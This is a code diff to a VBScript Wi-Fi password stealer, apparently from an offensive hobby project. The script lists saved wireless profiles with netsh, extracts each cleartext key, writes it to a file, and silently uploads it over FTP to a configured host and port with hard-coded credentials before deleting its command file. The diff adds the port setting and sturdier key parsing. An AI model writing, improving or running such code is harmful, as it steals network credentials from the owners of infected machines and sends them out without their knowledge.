@@ -6,6 +6,7 @@
 
 '///////////////// HOST INFO //////////////////
 HOST = "localhost"
+PORT = "666"
 USER = "admin"
 PASS = "password"
 '/////////////////////////////////////////////
@@ -30,37 +31,43 @@ Function saveIt(wifi, passwd)
 End Function
 
 
-Function createFTPInfo(username, password, wifiName)
+Function createFTPInfo(username, password, hostname, port, wifiName)
     With CreateObject("Scripting.FileSystemObject").CreateTextFile("cmd.txt")
-        .WriteLine "USER " & username 
-        .WriteLine password 
+        .WriteLine "OPEN " & hostname & " " & port
+        .WriteLine "USER " & username
+        .WriteLine password
         .WriteLine "send " & wifiName & ".txt"
         .WriteLine "quit"
-        .Close 
+        .Close
     End With
 End Function
 
-Function sendIt(hostname)
+Function sendIt
     With CreateObject("WScript.Shell")
-        .Run "%comspec% /c ftp -n -v -s:cmd.txt " & hostname, 0, True 
+        .Run "%comspec% /c ftp -n -v -s:cmd.txt", 0, True
         .Run "%comspec% /c del cmd.txt", 0, True
-    End With 
+    End With
 End Function
 
 strText=Split(GetOutput("netsh wlan show profile"), "\n")
 
 i = 0
 
-For Each x in strText 
+For Each x in strText
 	If i > 8 And i < Ubound(strText)-1 Then
 		Name = Split(x, ": ")(1)
-        createFTPInfo USER, PASS, Name
-		str=Split(GetOutput("netsh wlan show profile """ & Name & """ key=clear"), "\n")(32)
-		passwd = Split(str, ": ")
-		If Ubound(passwd) Then 
-			saveIt Name, passwd(1)
-            sendIt HOST
-		End If
+    createFTPInfo USER, PASS, HOST, PORT, Name
+		str=Split(GetOutput("netsh wlan show profile """ & Name & """ key=clear"), "\n")
+    For Each options in str
+      options=Replace(options, " ", "")
+      If UBound(Split(options, ":")) >= 1 Then
+        If Split(options, ":")(0) = "KeyContent" Then
+          passwd = Split(options, ":")(1)
+          saveIt Name, passwd
+          sendIt
+        End If
+      End If
+    Next
 	End If
 	i = i + 1
 Next
